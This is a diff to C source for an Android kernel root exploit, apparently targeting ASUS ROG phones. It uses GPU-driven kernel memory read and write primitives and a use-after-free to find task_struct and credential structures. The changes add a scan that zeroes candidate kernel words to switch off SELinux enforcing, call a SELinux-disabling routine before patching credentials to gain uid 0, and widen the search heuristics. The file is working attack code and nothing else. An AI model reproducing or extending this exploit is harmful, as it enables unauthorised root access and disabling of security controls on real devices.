@@ -102,47 +102,56 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     
     fprintf(stderr, "[SELINUX] Aggressive scan for enforcing bit around base 0x%lx...\n", (unsigned long)kbase);
     
-    // 1. Try to find the string "selinuxu:object_r" in kernel memory
-    // and then look for enforcing near it, or just scan typical ranges.
-    
+    // Scan for "selinuxu:object_r" string first to find rodata
+    uint64_t rodata_start = kbase + 0x2000000;
+    uint64_t rodata_end = kbase + 0x5000000;
+    uint8_t page[4096];
+    uint64_t ctx_str_va = 0;
+
+    for (uint64_t addr = rodata_start; addr < rodata_end; addr += 4096) {
+        if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
+            for (int i = 0; i < 4096 - 16; i++) {
+                if (memcmp(page + i, "selinuxu:object_r", 17) == 0) {
+                    ctx_str_va = addr + i;
+                    fprintf(stderr, "[SELINUX] Found context string at 0x%lx\n", (unsigned long)ctx_str_va);
+                    break;
+                }
+            }
+        }
+        if (ctx_str_va) break;
+    }
+
+    // Now look for enforcing near typical offsets if string search fails or as additional check
     uint64_t scan_ranges[][2] = {
+        {0x2f70000, 0x2f80000},
+        {0x3f70000, 0x3f80000},
+        {0x2bb0000, 0x2bc0000},
         {0x2f00000, 0x3100000},
-        {0x3f00000, 0x4100000},
-        {0x2a00000, 0x2c00000},
     };
     
-    for (int r = 0; r < 3; r++) {
+    for (int r = 0; r < 4; r++) {
         uint64_t start = kbase + scan_ranges[r][0];
         uint64_t end = kbase + scan_ranges[r][1];
         
-        fprintf(stderr, "[SELINUX] Scanning range 0x%lx - 0x%lx...\n", (unsigned long)start, (unsigned long)end);
-        
-        uint8_t page[4096];
         for (uint64_t addr = start; addr < end; addr += 4096) {
             if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
-                for (int i = 0; i < 4096 - 16; i += 4) {
+                for (int i = 0; i < 4096; i += 4) {
                     uint32_t val = *(uint32_t*)(page + i);
-                    if (val == 1) {
-                        // Check if it's surrounded by zeros (typical for enforcing)
-                        uint32_t prev = (i >= 4) ? *(uint32_t*)(page + i - 4) : 0;
-                        uint32_t next = (i <= 4092) ? *(uint32_t*)(page + i + 4) : 0;
-                        if (prev == 0 && next == 0) {
-                             // Potential candidate. Check if it's writable and stays 0.
-                             uint64_t cand = addr + i;
-                             fprintf(stderr, "[SELINUX] Candidate found at 0x%lx (off 0x%lx)\n", (unsigned long)cand, (unsigned long)(cand - kbase));
-                             
-                             uint32_t zero = 0;
-                             gpu_write_task_virt(fd, cand, (uint8_t*)&zero, 4);
-                             uint32_t check = 1;
-                             gpu_read_u32(fd, cand, &check);
-                             if (check == 0) {
-                                 fprintf(stderr, "[SELINUX] Verified! Enforcing is at 0x%lx\n", (unsigned long)cand);
-                                 return cand;
-                             }
-                             // Restore if not the one
-                             uint32_t one = 1;
-                             gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
-                        }
+                    if (val == 1) { // enforcing is usually 1
+                         uint64_t cand = addr + i;
+                         // On ROG, enforcing is often near these values
+                         uint32_t zero_check = 0;
+                         gpu_write_task_virt(fd, cand, (uint8_t*)&zero_check, 4);
+                         uint32_t verify = 1;
+                         gpu_read_u32(fd, cand, &verify);
+                         if (verify == 0) {
+                             fprintf(stderr, "[SELINUX] FOUND & VERIFIED at 0x%lx (off 0x%lx)\n", 
+                                     (unsigned long)cand, (unsigned long)(cand - kbase));
+                             return cand;
+                         }
+                         // Restore
+                         uint32_t one = 1;
+                         gpu_write_task_virt(fd, cand, (uint8_t*)&one, 4);
                     }
                 }
             }
@@ -1239,6 +1248,7 @@ static void safe_cred_patch(void)
     // If Parent already found cred_ptr, use it directly
     if (cred_ptr != 0) {
         fprintf(stderr, "[CHILD] Using cred_ptr from Parent: 0x%lx\n", (unsigned long)cred_ptr);
+        disable_selinux_via_gpu(fd);
         patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
         if (getuid() == 0) {
             fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0) via Parent's cred_ptr\n");
@@ -1281,32 +1291,43 @@ static void safe_cred_patch(void)
             if (comm_off != -1) {
                 fprintf(stderr, "[CHILD] Marker found at buffer offset 0x%x\n", comm_off);
                 
-                // Search for cred_ptr in a 1.5KB window around comm
+                // Search for cred_ptr in a wide window around comm
                 fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
                 int candidates_count = 0;
-                // Extended search window for ROG: -1200 to +400
-                for (int off = comm_off - 1200; off < comm_off + 400; off += 8) {
+                // Extended search window for ROG: -2000 to +1000
+                for (int off = comm_off - 2000; off < comm_off + 1000; off += 8) {
                     if (off < 0 || off > 8192 - 8) continue;
                     uint64_t ptr = *(uint64_t *)(big_task_data + off);
                     if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                         candidates_count++;
                         uint8_t cred_check[64];
                         if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
-                            uint32_t usage = *(uint32_t *)(cred_check + 0x00);
-                            uint32_t uid_at_4 = *(uint32_t *)(cred_check + 0x04);
-                            
-                            // Flexible check: UID can be at +0 or +4
-                            if ((usage == my_uid) || (uid_at_4 == my_uid)) {
-                                cred_ptr = ptr;
-                                fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at %s)\n", 
-                                        (unsigned long)cred_ptr, (usage == my_uid) ? "+0x00" : "+0x04");
-                                break;
+                            // On ROG, we check all 8-byte aligned offsets for the UID
+                            for (int co = 0; co < 32; co += 4) {
+                                uint32_t uid = *(uint32_t *)(cred_check + co);
+                                if (uid == my_uid) {
+                                    cred_ptr = ptr;
+                                    fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at +0x%x)\n", 
+                                            (unsigned long)cred_ptr, co);
+                                    break;
+                                }
                             }
+                            if (cred_ptr) break;
                         }
                     }
                 }
                 
+                if (cred_ptr == 0) {
+                    fprintf(stderr, "[CHILD] [!] Cred search failed. Dumping 256 bytes around marker...\n");
+                    for (int d = comm_off - 128; d < comm_off + 128; d += 16) {
+                        if (d < 0 || d > 8192 - 16) continue;
+                        fprintf(stderr, "  0x%04x: %016lx %016lx\n", d, 
+                                *(uint64_t*)(big_task_data + d), *(uint64_t*)(big_task_data + d + 8));
+                    }
+                }
+                
                 if (cred_ptr != 0) {
+                    disable_selinux_via_gpu(fd);
                     patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
                     if (getuid() == 0) {
                         fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
@@ -1737,17 +1758,17 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
                 (unsigned long)va, kptrs, strings, marker_off, found_str);
         
-        // Target bash fallback
-        if (marker_off == -1 && kptrs > 50 && (strstr(found_str, "bash") || strstr(found_str, "/bin/sh"))) {
-             fprintf(stderr, "\n      [!!!] Found BASH/SH task_struct candidate at VA 0x%lx!", (unsigned long)va);
-             // Dump 64 bytes for verification
-             fprintf(stderr, "\n      DUMP: ");
-             for (int i = 0; i < 64; i++) fprintf(stderr, "%02x ", data[i]);
+        // Target bash fallback: ROG task_struct often has kptrs > 100
+        if (marker_off == -1 && kptrs > 100) {
+             fprintf(stderr, "\n      [!!!] High K-PTR density at VA 0x%lx! Possible task_struct (Sample: \"%s\")", 
+                     (unsigned long)va, found_str);
              
-             // Save to gbuf for potential hijacking if KETO is not found
-             if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
-                 *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
-                 fprintf(stderr, " (saved as backup target)");
+             // If we see anything bash-like or just very high density, save it
+             if (strstr(found_str, "bash") || strstr(found_str, "sh") || strstr(found_str, "termux") || kptrs > 150) {
+                 if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
+                     *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
+                     fprintf(stderr, " (saved as backup target)");
+                 }
              }
         }
 
